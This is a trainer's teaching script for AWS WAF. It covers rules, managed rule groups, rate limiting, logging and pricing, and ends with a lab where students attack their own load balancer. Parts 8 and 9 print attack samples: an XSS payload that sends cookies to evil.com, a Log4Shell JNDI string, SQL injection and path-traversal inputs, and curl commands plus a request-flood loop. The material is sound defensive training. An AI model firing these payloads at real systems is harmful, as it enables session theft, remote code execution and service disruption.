# AWS WAF — Complete Teaching Script

> **For the trainer:** This is your word-for-word classroom script, continuing from the Route 53 session. Sections marked 🗣️ are what you SAY. Sections marked 🖥️ are what you DO on screen. Sections marked ❓ are questions to ask students.

---

## Transition from Route 53

### 🗣️ Bridge

*"Alright, so we've set up Route 53. Users can now find our StreamFlix site using a friendly domain name. DNS resolves, traffic reaches our server. Beautiful."*

*"But here's the question nobody asked: what KIND of traffic is reaching our server? Is it a genuine user wanting to watch a movie? Or is it a hacker trying to steal our database? Or a bot scraping our content? Or a competitor sending 10 million requests to crash us and inflate our AWS bill?"*

*"This is where WAF comes in."*

---

## Part 1: What Problem Does WAF Solve? (15 minutes)

### 🗣️ Opening — The Bouncer Analogy

*"Imagine you own a nightclub. You've got a great DJ (your app), good drinks (your content), and nice decor (your UI). People are lining up. But you also have:"*

- *A drunk guy trying to start fights (DDoS attacker)*
- *Someone with a fake ID (credential stuffing)*
- *A person trying to sneak in through the back door (SQL injection)*
- *Someone standing at the entrance blocking everyone else (Layer 7 DDoS)*
- *A rival club owner sending 1,000 people just to fill up your space and turn away real customers (resource exhaustion)*

*"What do you do? You hire a BOUNCER. The bouncer stands at the door. Every person is checked. Real customers get in. Troublemakers get kicked out. That bouncer is your WAF — Web Application Firewall."*

---

### 🗣️ What is AWS WAF?

*"AWS WAF is a Layer 7 firewall. Let me explain what that means."*

*"The OSI model has 7 layers. You've heard of them. At the bottom:"*

```
Layer 1: Physical      (cables, signals)
Layer 2: Data Link     (MAC addresses, switches)
Layer 3: Network       (IP addresses, routers)
Layer 4: Transport     (TCP/UDP, ports)
        ───────────────────────────────
        Traditional firewalls stop here ↑
        ───────────────────────────────
Layer 5: Session       (connections)
Layer 6: Presentation  (encryption, compression)
Layer 7: Application   (HTTP, URLs, cookies, headers)
        ───────────────────────────────
        WAF operates here ↑
        ───────────────────────────────
```

*"A traditional firewall (like a Security Group or NACL in AWS) works at Layer 3/4. It can say: 'Block all traffic from IP 1.2.3.4' or 'Only allow port 443.' But it has NO IDEA what's inside the HTTP request."*

*"WAF works at Layer 7. It can read the ENTIRE HTTP request — the URL, the headers, the cookies, the body, the query string. So it can say:"*

- *'Block requests where the URL contains `' OR 1=1`' (SQL injection)*
- *'Block requests from this country'*
- *'Block this specific IP if it sends more than 100 requests in 5 minutes'*
- *'Block requests where the User-Agent header says "BadBot/1.0"'*

### ❓ Ask Students:

*"Can a Security Group block a SQL injection attack?"*

*"Answer: No. A Security Group only sees IP addresses and ports. It doesn't inspect the HTTP request body. SQL injection happens at Layer 7 — you need a WAF."*

---

### 🗣️ Where Does WAF Sit in the Architecture?

```
User → Route 53 → WAF → CloudFront/ALB/API Gateway → Your App
                   ↑
            WAF inspects HERE
            before traffic reaches
            your application
```

*"WAF sits in FRONT of your application. It inspects every single request BEFORE it reaches your code. If the request is malicious, WAF blocks it and your application never even sees it."*

### 🗣️ What Can WAF Attach To?

*"WAF can only be attached to three AWS resources:"*

| Resource | Scope | Use Case |
|----------|-------|----------|
| **CloudFront** | Global (all edge locations) | Static sites, CDN-fronted apps |
| **Application Load Balancer (ALB)** | Regional | EC2-based apps, ECS, EKS |
| **API Gateway** | Regional | REST APIs, HTTP APIs |
| **AppSync** | Regional | GraphQL APIs |
| **Cognito User Pool** | Regional | Auth endpoints |
| **Verified Access** | Regional | Zero-trust access |

*"Notice: WAF does NOT attach to EC2 directly. You put an ALB or CloudFront in front of EC2, then attach WAF to the ALB/CloudFront."*

### ❓ Ask Students:

*"I have a single EC2 instance serving a website. Can I attach WAF directly to it?"*

*"Answer: No. You need to put the EC2 behind an ALB first, then attach WAF to the ALB. Or put CloudFront in front and attach WAF to CloudFront."*

---

## Part 2: WAF Building Blocks (20 minutes)

### 🗣️ The Hierarchy

*"WAF has a very specific structure. Let me draw it:"*

```
Web ACL (Web Access Control List)
  │
  ├── Rule 1 (Priority: 1)
  │     └── Statement: "If IP is in this list → BLOCK"
  │
  ├── Rule 2 (Priority: 2)
  │     └── Rule Group: AWS Managed Rules — Common Rule Set
  │           ├── Sub-rule: Block NoUserAgent
  │           ├── Sub-rule: Block SizeRestrictions
  │           └── Sub-rule: Block CrossSiteScripting
  │
  ├── Rule 3 (Priority: 3)
  │     └── Statement: "If rate > 100 req/5min → BLOCK"
  │
  └── Default Action: ALLOW
```

*"Let me explain each piece:"*

---

### 🗣️ Web ACL (Web Access Control List)

*"The Web ACL is the TOP-LEVEL container. Think of it as the bouncer's rulebook. It contains all your rules, and it's what you attach to CloudFront or ALB."*

**Key facts:**
- *One Web ACL can be attached to MULTIPLE resources (e.g., one Web ACL protecting 5 ALBs)*
- *Each resource can only have ONE Web ACL attached*
- *Has a DEFAULT ACTION — what to do if no rules match: ALLOW or BLOCK*
- *For CloudFront: Web ACL must be created in `us-east-1` (global scope)*
- *For ALB/API Gateway: Web ACL must be in the same region as the resource*

### 🗣️ Capacity Units (WCUs)

*"Every rule consumes capacity units. A Web ACL has a maximum of 5,000 WCUs (newer accounts get up to 5,000). Simple rules use 1-5 WCUs. Complex regex rules use more. AWS Managed Rule Groups typically use 700-1,000 WCUs."*

*"You probably won't hit this limit unless you're doing something very complex."*

---

### 🗣️ Rules

*"Rules are conditions. Each rule has:"*

1. **A Statement** — the condition to match (IP, country, string in URL, etc.)
2. **An Action** — what to do if the condition matches

### 🗣️ Rule Actions

| Action | What It Does | When to Use |
|--------|-------------|-------------|
| **ALLOW** | Let the request through | Whitelist trusted IPs |
| **BLOCK** | Reject with 403 Forbidden | Block attacks |
| **COUNT** | Let it through but count it | Testing new rules before enforcing |
| **CAPTCHA** | Show a CAPTCHA challenge | Suspected bots |
| **Challenge** | Silent browser challenge (JS) | Verify it's a real browser |

*"COUNT is incredibly important. When you first create a rule, set it to COUNT, not BLOCK. Monitor for a week. See what it would have blocked. If it's blocking legitimate users → fix the rule. If it's only blocking bad traffic → switch to BLOCK. This prevents you from accidentally blocking your own customers."*

### ❓ Ask Students:

*"I just wrote a new WAF rule and I'm confident it works. Should I deploy it as BLOCK immediately to production?"*

*"Answer: NEVER. Always deploy as COUNT first. Monitor for 24-48 hours minimum. Check CloudWatch metrics and WAF logs. Then switch to BLOCK. This is called a 'dry run' or 'observation mode.'"*

---

### 🗣️ Rule Priority

*"Rules are evaluated in ORDER, from lowest priority number to highest. First match wins."*

```
Priority 1: If IP = 1.2.3.4          → BLOCK     ← Checked first
Priority 2: If Country = North Korea  → BLOCK     
Priority 3: If rate > 100/5min       → BLOCK     
Priority 4: AWS Common Rule Set      → BLOCK     ← Checked last
Default:                              → ALLOW     ← If nothing matches
```

*"If a request matches Priority 1, it's blocked immediately. Rules 2, 3, and 4 are never evaluated for that request."*

*"Best practice: Put your most specific rules FIRST (lowest priority number). Put broad rules LAST."*

---

### 🗣️ Statements — The Conditions

*"A statement is the actual condition being checked. Here are all the statement types:"*

#### Match Statements (Inspect the Request)

| Statement | What It Checks | Example |
|-----------|---------------|---------|
| **IP Set** | Source IP address | Block `1.2.3.4/32`, `10.0.0.0/8` |
| **Geo Match** | Country of origin | Block traffic from Country X |
| **Size Constraint** | Size of request component | Block if body > 10KB |
| **Regex Pattern** | Regex match on request component | Block if URL matches `.*admin.*` |
| **String Match** | Exact/contains/starts/ends with | Block if URL contains `wp-admin` |
| **SQLi Detection** | SQL injection patterns | Auto-detect `' OR 1=1 --` |
| **XSS Detection** | Cross-site scripting patterns | Auto-detect `<script>alert()` |
| **Byte Match** | Raw byte match | Block specific binary patterns |
| **Label Match** | Labels from previous rules | If labeled "suspicious" → BLOCK |

#### Logical Statements (Combine Conditions)

| Statement | Logic | Example |
|-----------|-------|---------|
| **AND** | All conditions must match | Country = US AND rate > 1000 |
| **OR** | Any condition must match | URL contains `/admin` OR `/wp-login` |
| **NOT** | Invert the condition | NOT from trusted IP list → BLOCK |

*"You can nest these. Example: Block if (Country = China OR Country = Russia) AND (URL contains `/api`) AND (rate > 50 requests/5min). This targets API abuse from specific countries."*

---

#### What Can You Inspect?

*"For each statement, you choose WHAT PART of the request to look at:"*

| Request Component | What It Is | Example Use |
|-------------------|-----------|-------------|
| **URI Path** | The URL path | `/login`, `/api/users` |
| **Query String** | After the `?` | `?search=shoes&color=red` |
| **HTTP Method** | GET, POST, etc. | Block all DELETE requests |
| **Headers** | Any HTTP header | Check `User-Agent`, `Referer`, `Authorization` |
| **Single Header** | One specific header | Block if `User-Agent` = `BadBot` |
| **All Headers** | All headers combined | Search all headers for SQLi |
| **Cookies** | Cookie values | Check session cookies for tampering |
| **Body** | Request body (POST data) | Check form submissions for XSS |
| **JSON Body** | Parsed JSON body | Inspect specific JSON fields |

---

## Part 3: Types of Rules (15 minutes)

### 🗣️ Custom Rules vs Managed Rules

*"You can write your own rules from scratch (custom rules). Or you can use pre-built rule packs (managed rules). Let me explain both."*

---

### 🗣️ Custom Rules — You Build Them

*"Custom rules are rules YOU write based on your specific needs."*

**Example 1: Block a specific IP**
```
Statement: IP Set match
IP Set: [203.0.113.50/32, 198.51.100.0/24]
Action: BLOCK
```

**Example 2: Rate Limiting**
```
Statement: Rate-based (100 requests per 5 minutes)
Scope: Per source IP
Action: BLOCK
```
*"If any single IP sends more than 100 requests in a 5-minute window, block them for the rest of that window. This stops basic DDoS attacks and scrapers."*

**Example 3: Geo Blocking**
```
Statement: Geo match
Countries: [CN, RU, KP]  (China, Russia, North Korea)
Action: BLOCK
```

**Example 4: Block WordPress Scanners**
```
Statement: String match
Field: URI Path
Match: Contains
String: "wp-admin"
Action: BLOCK
```
*"Bots constantly scan the internet for WordPress admin pages. If you're not running WordPress, block these requests. It reduces noise and saves compute."*

---

### 🗣️ AWS Managed Rules — Pre-Built by AWS

*"AWS provides free rule groups maintained by their security team. These are updated automatically as new threats emerge. You don't maintain them."*

#### The Big Four (Use These In Production)

**1. AWSManagedRulesCommonRuleSet (Core Rule Set — CRS)**
*"The most important managed rule group. Based on the OWASP Top 10. Blocks:"*
- Requests with no User-Agent header (bots)
- Oversized requests (buffer overflow attempts)
- Cross-site scripting (XSS) in headers and body
- Requests matching known attack patterns
- *WCU cost: 700*

**2. AWSManagedRulesKnownBadInputsRuleSet**
*"Blocks requests with inputs known to be malicious:"*
- Log4j / Log4Shell exploits (`${jndi:ldap://...}`)
- Java deserialization attacks
- Host header attacks
- *WCU cost: 200*

*"Remember Log4Shell in December 2021? It was one of the worst vulnerabilities in history. This rule group blocks it automatically."*

**3. AWSManagedRulesSQLiRuleSet**
*"Specifically targets SQL injection in:"*
- Query strings (`?id=1' OR '1'='1`)
- Body (form submissions)
- Cookies
- URI path
- *WCU cost: 200*

**4. AWSManagedRulesAmazonIpReputationList**
*"Blocks IPs that AWS has identified as malicious:"*
- Known botnets
- Known scanners
- IPs on AWS threat intelligence lists
- *WCU cost: 25*

#### Other Managed Rule Groups

| Rule Group | What It Does | WCU |
|-----------|-------------|-----|
| **Anonymous IP List** | Blocks Tor, VPN, hosting provider IPs | 50 |
| **Bot Control** | Identifies and manages bots (good and bad) | 50 |
| **Account Takeover Prevention** | Detects credential stuffing on login pages | 50 |
| **Account Creation Fraud** | Prevents fake account signups | 50 |
| **Linux/POSIX OS** | Blocks Linux command injection (LFI) | 200 |
| **Windows OS** | Blocks Windows-specific attacks (PowerShell) | 200 |
| **PHP Application** | Blocks PHP-specific exploits | 100 |
| **WordPress Application** | Blocks WordPress-specific attacks | 100 |

---

### 🗣️ Marketplace Managed Rules — Third Party

*"On top of AWS managed rules, third-party security companies sell rule sets on the AWS Marketplace:"*

- **Fortinet** — Advanced threat intelligence
- **F5** — Bot protection, API security
- **Imperva** — Comprehensive web security
- **Trend Micro** — Known threat patterns

*"These cost $20-200/month on top of WAF pricing. For most apps, the AWS managed rules are more than enough."*

---

## Part 4: Rate-Based Rules Deep Dive (10 minutes)

### 🗣️ What is Rate Limiting?

*"Rate-based rules count how many requests come from a single source in a 5-minute window. If they exceed your threshold, WAF blocks them."*

```
Threshold: 100 requests per 5 minutes
IP 1.2.3.4 sends request #1   → ALLOW  (count: 1)
IP 1.2.3.4 sends request #50  → ALLOW  (count: 50)
IP 1.2.3.4 sends request #100 → ALLOW  (count: 100)
IP 1.2.3.4 sends request #101 → BLOCK! (threshold exceeded)

... 5 minutes later, counter resets, IP is unblocked
```

### 🗣️ Aggregation Keys

*"By default, rate limiting counts per SOURCE IP. But you can aggregate by other keys:"*

| Aggregate By | What It Does | Use Case |
|-------------|-------------|----------|
| **Source IP** (default) | Count per IP | Basic DDoS protection |
| **Forwarded IP** | Count per X-Forwarded-For header | When behind a proxy/CDN |
| **Custom Key** | Count per header, query param, cookie, etc. | Rate limit per API key |
| **IP + URI** | Count per IP per URL path | Allow 1000 req/5min overall but only 10 to `/login` |

### 🗣️ Real-World Rate Limits

| Endpoint | Recommended Limit | Why |
|----------|-------------------|-----|
| Login page (`/login`) | 10-20 per 5 min | Prevent brute force |
| API endpoint | 100-500 per 5 min | Prevent abuse |
| Static pages | 1000-2000 per 5 min | Normal browsing |
| Webhooks | 50 per 5 min | Prevent replay attacks |

*"Start generous, then tighten. It's better to let some bad traffic through than to block real users."*

---

## Part 5: IP Sets and Geo Blocking (10 minutes)

### 🗣️ IP Sets

*"An IP Set is a reusable list of IP addresses or CIDR ranges. You create it once, then reference it in multiple rules."*

```
IP Set: "BlockedIPs"
  ├── 203.0.113.50/32       (single IP)
  ├── 198.51.100.0/24       (256 IPs) 
  └── 10.0.0.0/8            (16 million IPs)
```

*"Max 10,000 IP ranges per IP set. Supports IPv4 and IPv6."*

**Use cases:**
- Block known attacker IPs
- Whitelist office IP ranges (put an ALLOW rule with priority 0)
- Block IPs reported by abuse monitoring tools

### 🗣️ Geo Blocking

*"Block or allow entire countries."*

```
Statement: Geo Match
Countries: [CN, RU, KP, IR]
Action: BLOCK
```

*"Real talk: Geo blocking is a blunt instrument. Attackers use VPNs. But it DOES reduce noise significantly. If you're running a India-only banking app, why accept traffic from North Korea?"*

### 🗣️ Geo Blocking vs Route 53 Geolocation

| Feature | WAF Geo Block | Route 53 Geolocation |
|---------|--------------|---------------------|
| What it does | BLOCKS requests from a country | ROUTES requests to different servers |
| Layer | Layer 7 (HTTP) | DNS (before HTTP) |
| Action | 403 Forbidden | Return different IP |
| Use case | Security — keep attackers out | Content — show different content |

*"Use Route 53 Geolocation to SERVE different content per country. Use WAF Geo Blocking to DENY access from certain countries. They solve different problems."*

---

## Part 6: WAF Logging and Monitoring (10 minutes)

### 🗣️ Where Do Logs Go?

*"WAF can send logs to three destinations:"*

| Destination | Cost | Best For |
|-------------|------|----------|
| **CloudWatch Logs** | $0.50/GB ingested | Quick debugging, alarms |
| **S3 Bucket** | $0.023/GB stored | Long-term storage, compliance |
| **Kinesis Firehose** | $0.029/GB | Real-time streaming to SIEM tools |

### 🗣️ What's In the Logs?

*"Every request that matches a rule generates a log entry with:"*

```json
{
  "timestamp": 1681234567890,
  "action": "BLOCK",
  "terminatingRuleId": "AWSManagedRulesCommonRuleSet",
  "terminatingRuleMatchDetails": [
    {
      "conditionType": "XSS",
      "location": "QUERY_STRING",
      "matchedData": ["<script>"]
    }
  ],
  "httpRequest": {
    "clientIp": "203.0.113.50",
    "country": "US",
    "uri": "/search",
    "args": "q=<script>alert('xss')</script>",
    "headers": [
      {"name": "user-agent", "value": "Mozilla/5.0..."}
    ]
  }
}
```

*"You can see: what was blocked, which rule blocked it, what the attacker sent, and where they came from."*

### 🗣️ CloudWatch Metrics (Built-in, Free)

*"WAF automatically publishes these CloudWatch metrics — no setup needed:"*

| Metric | What It Shows |
|--------|--------------|
| **AllowedRequests** | Requests that passed through |
| **BlockedRequests** | Requests that were blocked |
| **CountedRequests** | Requests that matched COUNT rules |
| **PassedRequests** | Requests evaluated but not matched by any rule |

*"Set a CloudWatch Alarm: if BlockedRequests > 1000 in 5 minutes → send SNS notification → you're under attack."*

---

## Part 7: WAF Pricing (5 minutes)

### 🗣️ How Much Does It Cost?

| Component | Cost |
|-----------|------|
| **Web ACL** | $5/month |
| **Rule** | $1/month per rule |
| **Request inspection** | $0.60 per million requests |
| **Bot Control** | $10/month + $1/million requests |
| **Account Takeover** | $10/month + $1/million requests |
| **Fraud Control** | $10/month + $1/million requests |

*"For a typical application with 4 rules (rate limit + 3 managed rule groups):"*

```
Web ACL:     $5/month
4 rules:     $4/month (4 × $1)
Requests:    $0.60/million
────────────────────────
Total:       ~$10/month + request costs
```

*"Dirt cheap for what you get. A single successful SQL injection attack could cost you millions in data breach fines."*

### 🗣️ Free Tier?

*"There IS a small benefit: When you enable WAF during CloudFront distribution creation using the 'Enable security protections' checkbox, AWS provides a basic WAF setup with some protections for free (included in CloudFront pricing). But full WAF with custom rules has the pricing above."*

---

## Part 8: Common Attack Types WAF Blocks (15 minutes)

### 🗣️ Attack 1: SQL Injection (SQLi)

*"The #1 web application attack. The attacker injects SQL code into your input fields."*

**How it works:**
```
Normal login:
  Username: john
  Password: mypassword123
  → SQL: SELECT * FROM users WHERE username='john' AND password='mypassword123'
  → Result: 1 user found ✓

SQL Injection:
  Username: ' OR '1'='1' --
  Password: anything
  → SQL: SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
  → The -- comments out the rest!
  → '1'='1' is always true!
  → Result: ALL users returned! Attacker is logged in as the first user (usually admin)!
```

*"WAF detects this pattern in URLs, query strings, form bodies, and cookies. It sees `' OR '1'='1` and immediately blocks the request with 403."*

---

### 🗣️ Attack 2: Cross-Site Scripting (XSS)

*"The attacker injects JavaScript into your page that runs in OTHER users' browsers."*

**How it works:**
```
Attacker posts a comment:
  <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

When another user views the page:
  → The script runs in their browser
  → Sends their session cookie to evil.com
  → Attacker hijacks their session
```

*"WAF scans request bodies, query strings, and headers for `<script>`, `javascript:`, `onerror=`, and hundreds of other XSS patterns."*

---

### 🗣️ Attack 3: DDoS (Distributed Denial of Service)

*"The attacker floods your server with requests to make it crash or become slow."*

```
Normal:    100 requests/minute    → Server handles it fine
DDoS:      1,000,000 requests/minute → Server crashes

Layer 3/4 DDoS: Flood with raw network packets
               → AWS Shield handles this (free, automatic)

Layer 7 DDoS:  Flood with valid-looking HTTP requests
               → WAF rate limiting handles this
               → Example: 10,000 requests to /search per second from a botnet
```

*"Rate-based rules are your first defense against Layer 7 DDoS."*

---

### 🗣️ Attack 4: Log4Shell (CVE-2021-44228)

*"In December 2021, a devastating vulnerability was discovered in Log4j, a logging library used by millions of Java applications."*

```
Attack: Send this in any HTTP header:
  ${jndi:ldap://evil.com/exploit}

What happens:
  → Log4j processes this as a command, not a string
  → It connects to evil.com and downloads malicious code
  → The attacker gets full control of your server
```

*"The `AWSManagedRulesKnownBadInputsRuleSet` blocks this pattern. AWS added the rule within 24 hours of the vulnerability being published. If you had WAF enabled, you were protected before you even knew about the vulnerability."*

---

### 🗣️ Attack 5: Path Traversal / LFI

*"The attacker tries to read files from your server that they shouldn't have access to."*

```
Normal request:
  GET /images/photo.jpg

Path traversal:
  GET /images/../../../etc/passwd
  → Server tries to read /etc/passwd (Linux password file!)
```

*"WAF blocks requests containing `../`, `..%2f`, and other directory traversal sequences."*

---

## Part 9: Practical Demo (30 minutes)

### 🗣️ Transition

*"Enough theory. Let's actually SET UP WAF and ATTACK our own StreamFlix application. We're going to be both the defender and the attacker."*

---

### 🖥️ Demo 1: Create a Web ACL in the Console

1. **Open WAF Console** → **Create Web ACL**
2. **Settings:**
   - **Name:** `streamflix-waf`
   - **Resource type:** `Regional` (for ALB) or `CloudFront` (for CDN)
   - **Region:** Same as your ALB
   - **Associated resources:** Select your ALB
3. **Default action:** `ALLOW` (allow everything unless a rule blocks it)

### 🖥️ Demo 2: Add AWS Managed Rules

*"First, let's add the pre-built protections:"*

1. Click **Add managed rule groups**
2. Expand **AWS managed rule groups**
3. Toggle ON these four:
   - ✅ **Core rule set** (AWSManagedRulesCommonRuleSet)
   - ✅ **Known bad inputs** (AWSManagedRulesKnownBadInputsRuleSet)
   - ✅ **SQL database** (AWSManagedRulesSQLiRuleSet)
   - ✅ **Amazon IP reputation list** (AWSManagedRulesAmazonIpReputationList)
4. Click **Add rules**

*"Show students the capacity counter — it should show around 1,125 WCUs used out of 5,000."*

### 🖥️ Demo 3: Add a Rate Limiting Rule

1. Click **Add rules** → **Add my own rules**
2. **Rule type:** Rate-based rule
3. **Name:** `RateLimit`
4. **Rate limit:** `100` (requests per 5 minutes)
5. **IP address to use:** Source IP address
6. **Action:** `Block`
7. Set **Priority** to `1` (evaluated first)

### 🖥️ Demo 4: Add Geo Blocking Rule

1. Click **Add rules** → **Add my own rules**
2. **Rule type:** Regular rule
3. **Name:** `GeoBlock`
4. **Statement:**
   - Match type: `Originates from a country in`
   - Country codes: Select 2-3 countries
5. **Action:** `Block`

### 🖥️ Demo 5: Show the Web ACL Summary

*"Show students the final Web ACL with all rules and their priorities:"*

```
Priority 1: RateLimit          — Rate-based (100/5min) → BLOCK
Priority 2: GeoBlock           — Geo Match → BLOCK
Priority 3: CommonRuleSet      — AWS Managed → BLOCK
Priority 4: KnownBadInputs    — AWS Managed → BLOCK
Priority 5: SQLiRuleSet       — AWS Managed → BLOCK
Priority 6: IPReputationList  — AWS Managed → BLOCK
Default:                       → ALLOW
```

---

### 🖥️ Demo 6: Attack — SQL Injection

*"Now let's be the hacker. Open your terminal:"*

```bash
# Normal request — should return 200
curl -s -o /dev/null -w "%{http_code}" "http://YOUR-ALB-URL/"
# → 200 ✓

# SQL Injection in query string — should be BLOCKED
curl -s -o /dev/null -w "%{http_code}" "http://YOUR-ALB-URL/?id=1%27%20OR%20%271%27%3D%271"
# → 403 BLOCKED! ✓

# Another SQLi pattern
curl -s -o /dev/null -w "%{http_code}" "http://YOUR-ALB-URL/search?q=1%20UNION%20SELECT%20*%20FROM%20users"
# → 403 BLOCKED! ✓
```

*"See that 403? WAF caught the SQL injection and rejected it before it reached nginx!"*

---

### 🖥️ Demo 7: Attack — XSS

```bash
# XSS in query string
curl -s -o /dev/null -w "%{http_code}" "http://YOUR-ALB-URL/?name=<script>alert('xss')</script>"
# → 403 BLOCKED! ✓

# XSS in a header
curl -s -o /dev/null -w "%{http_code}" -H "Referer: <script>alert(1)</script>" "http://YOUR-ALB-URL/"
# → 403 BLOCKED! ✓
```

---

### 🖥️ Demo 8: Attack — Rate Limiting

*"Let's flood the server and see rate limiting kick in:"*

```bash
# Send 150 requests rapidly
for i in $(seq 1 150); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://YOUR-ALB-URL/")
  echo "Request $i: HTTP $CODE"
done

# You'll see:
# Request 1: HTTP 200
# Request 2: HTTP 200
# ...
# Request 100: HTTP 200
# Request 101: HTTP 403    ← BLOCKED!
# Request 102: HTTP 403    ← BLOCKED!
# ...
```

*"Show students: after request 100, every subsequent request gets 403. The rate limiter kicked in! In 5 minutes, the block will lift automatically."*

---

### 🖥️ Demo 9: Attack — Log4Shell

```bash
# Log4Shell exploit attempt in User-Agent header
curl -s -o /dev/null -w "%{http_code}" \
  -H 'User-Agent: ${jndi:ldap://evil.com/exploit}' \
  "http://YOUR-ALB-URL/"
# → 403 BLOCKED! ✓
```

*"A real Log4Shell payload, blocked instantly by the Known Bad Inputs rule group. Your application never saw this request."*

---

### 🖥️ Demo 10: Check WAF Metrics in CloudWatch

1. Open **CloudWatch** → **Metrics** → **WAF**
2. Select your Web ACL
3. Show the graphs:
   - `AllowedRequests` — normal traffic getting through
   - `BlockedRequests` — attacks that were stopped
4. *"See that spike? That's when we ran the rate limit test. 50 blocked requests."*

### 🖥️ Demo 11: Show WAF Sampled Requests

1. Go back to **WAF Console** → Your Web ACL
2. Click the **Overview** tab
3. Scroll to **Sampled requests**
4. *"You can see the actual blocked requests — the IP, the URI, which rule blocked them, and the request headers. This is forensic evidence."*

---

## Part 10: Best Practices (5 minutes)

### 🗣️ WAF Best Practices

1. **Start with COUNT, not BLOCK** — Always test rules in observation mode first
2. **Use AWS Managed Rules as your baseline** — Don't reinvent the wheel
3. **Rate limit everything** — Especially login, signup, and API endpoints
4. **Log everything to S3** — You need forensic data after an incident
5. **Set CloudWatch alarms** — Alert when BlockedRequests spike
6. **Review sampled requests weekly** — Check for false positives
7. **Keep managed rules updated** — They update automatically, but verify
8. **Use CAPTCHA for login pages** — Better than blocking (fewer false positives)
9. **Whitelist your own IPs first** — Add your office/VPN IPs with ALLOW at priority 0
10. **Layer your defenses** — WAF + Shield + Security Groups + NACLs

---

## Part 11: Interview Questions (5 minutes)

### 🗣️ Top 10 WAF Interview Questions

1. **What layer does WAF operate at?**
   → Layer 7 (Application layer). It inspects HTTP/HTTPS requests.

2. **What AWS resources can WAF attach to?**
   → CloudFront, ALB, API Gateway, AppSync, Cognito User Pool, Verified Access.

3. **Can WAF attach directly to EC2?**
   → No. Put EC2 behind an ALB first, then attach WAF to the ALB.

4. **What's the difference between WAF and Shield?**
   → WAF: Layer 7 (HTTP attacks — SQLi, XSS, rate limiting). Shield: Layer 3/4 (network DDoS — SYN floods, UDP reflection). Shield Standard is free and automatic.

5. **What is a Web ACL?**
   → The top-level container that holds WAF rules. You attach it to CloudFront/ALB.

6. **What does COUNT action do?**
   → Lets the request through but logs it. Used for testing rules before blocking.

7. **How does rate limiting work?**
   → Counts requests per IP in a 5-minute window. Exceeding the threshold triggers the action.

8. **What are managed rules?**
   → Pre-built rule groups maintained by AWS or third-party vendors. Updated automatically.

9. **How do you handle false positives?**
   → Use COUNT mode, review sampled requests, add exceptions for known-good patterns, whitelist trusted IPs.

10. **Where should the Web ACL be created for CloudFront?**
    → `us-east-1` (N. Virginia). CloudFront is global and only accepts global-scoped WAF resources.

---

## Timing Summary

| Section | Duration |
|---------|----------|
| Part 1: What WAF Solves | 15 min |
| Part 2: Building Blocks | 20 min |
| Part 3: Types of Rules | 15 min |
| Part 4: Rate Limiting | 10 min |
| Part 5: IP Sets & Geo | 10 min |
| Part 6: Logging & Monitoring | 10 min |
| Part 7: Pricing | 5 min |
| Part 8: Attack Types | 15 min |
| Part 9: Practical Demo | 30 min |
| Part 10: Best Practices | 5 min |
| Part 11: Interview Questions | 5 min |
| **Total** | **~2.5 hours** |

> **Trainer tip:** Take a break after Part 5 (before Logging). The first half is concepts, the second half is hands-on attack/defense. Students need energy for the attack demos — that's the exciting part.

> **Trainer tip:** During the attack demos, have students run the curl commands themselves from CloudShell. Let them see the 403s on their own screens. It's 10x more impactful than watching you do it.
